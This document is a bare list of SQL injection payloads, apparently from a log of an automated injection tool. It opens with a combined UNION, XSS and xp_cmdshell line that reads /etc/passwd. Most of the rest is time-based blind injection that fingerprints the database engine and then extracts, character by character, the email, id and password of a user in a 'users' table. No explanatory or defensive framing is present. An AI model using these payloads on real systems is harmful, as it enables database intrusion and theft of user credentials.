    1&Trzb=3367 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
    1.)("((',.)
    1'PiMRmD<'">ajxHBH
    1) AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg) AND (9412=9412
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg)
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(0)))aOQg)
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg)
    1 AND (SELECT 1695 FROM (SELECT(SLEEP(5-(IF(24=24,0,5)))))rjsE)
    1 AND (SELECT 6278 FROM (SELECT(SLEEP(5-(IF(24=33,0,5)))))pvEe)
    1 AND (SELECT 9896 FROM (SELECT(SLEEP(5-(IF(24=35,0,5)))))lZEL)
    1 AND (SELECT 5199 FROM (SELECT(SLEEP(5-(IF(35=33,0,5)))))NOgr)
    1 AND (SELECT 9251 FROM (SELECT(SLEEP(5-(IF(33=33,0,5)))))fXRc)
    1 AND (SELECT 3281 FROM (SELECT(SLEEP(5-(IF(35 33,0,5)))))PZSt)
    1 AND (SELECT 2185 FROM (SELECT(SLEEP(5-(IF(7455=7455,0,5)))))FSgS) 
    1 AND (SELECT 7632 FROM (SELECT(SLEEP(5-(IF(8343>8342,0,5)))))OcDU)
    1 AND (SELECT 6943 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))XSkE)
    1 AND (SELECT 1424 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x255469444225,0,5)))))Pnaw)
    1 AND (SELECT 4468 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x256472697a7a6c6525,0,5)))))DYKa)
    1 AND (SELECT 1540 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x25506572636f6e6125,0,5)))))cXJn)
    1 AND (SELECT 5028 FROM (SELECT(SLEEP(5-(IF(AURORA_VERSION() LIKE 0x25,0,5)))))xmVW)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>51,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>48,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>49,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>50,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=51,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>51,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>48,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>9,0,2)))))nONV)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>119,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))!=119,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>118,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))>117,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),14,1))!=117,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>48,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>1,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>24,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>36,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>42,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>45,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))>46,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),15,1))!=46,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>64,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>100,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>98,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))>99,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),16,1))!=99,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))>111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),17,1))!=111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))>109,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),18,1))!=109,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),19,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),19,1))>48,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),19,1))>1,0,2)))))eRMo)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>64,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>32,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>48,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>56,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>52,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>50,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>51,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))!=52,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>47,0,2)))))iyIr)
  1 AND (SELECT 4841 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(id AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>1,0,2)))))iyIr)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>64,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>32,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>48,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>56,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))!=49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>87,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>67,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>57,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))!=50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>87,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>67,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>57,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>51,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))!=51,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>87,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>67,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>57,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>51,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))!=51,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>87,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>67,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>57,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))!=50,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>87,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>67,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>57,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>52,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>48,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))!=49,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>47,0,2)))))gqUE)
  1 AND (SELECT 8129 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>1,0,2)))))gqUE)
